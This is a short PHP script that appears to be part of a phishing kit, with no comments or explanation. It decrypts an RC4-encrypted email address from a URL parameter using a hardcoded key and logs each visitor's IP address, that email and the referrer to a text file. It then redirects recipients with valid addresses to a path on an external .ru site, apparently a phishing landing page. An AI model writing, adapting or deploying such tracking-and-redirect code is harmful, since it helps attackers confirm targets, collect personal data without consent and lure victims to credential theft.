<?php
$key = 'TlIJiKsYwRMWXwxknmgEGBLCSWYUEqZu';
$val = hex2bin(str_replace('/', '', $_GET['val']));

file_put_contents('stat.txt', $_SERVER['REMOTE_ADDR'].";".RC4::Decrypt($key, $val).";".$_SERVER['HTTP_REFERER']."\n",  FILE_APPEND);

if (filter_var(RC4::Decrypt($key, $val), FILTER_VALIDATE_EMAIL)) {
 	header("Location: http://www.spinvinyl.ru/assets/jaqh/");
}

class RC4{
 	public function Encrypt($a,$b){
 	 	for($i,$c;$i<256;$i++)$c[$i]=$i;
 	 	for($i=0,$d,$e,$g=strlen($a);$i<256;$i++){
 	 	 	$d=($d+$c[$i]+ord($a[$i%$g]))%256;
 	 	 	$e=$c[$i];
 	 	 	$c[$i]=$c[$d];
 	 	 	$c[$d]=$e;
 	 	}
 	 	for($y,$i,$d=0,$f;$y<strlen($b);$y++){
 	 	 	$i=($i+1)%256;
 	 	 	$d=($d+$c[$i])%256;
 	 	 	$e=$c[$i];
 	 	 	$c[$i]=$c[$d];
 	 	 	$c[$d]=$e;
 	 	 	$f.=chr(ord($b[$y])^$c[($c[$i]+$c[$d])%256]);
 	 	}
 	 	return $f;
 	}
 	public function Decrypt($a,$b){return RC4::Encrypt($a,$b);}
}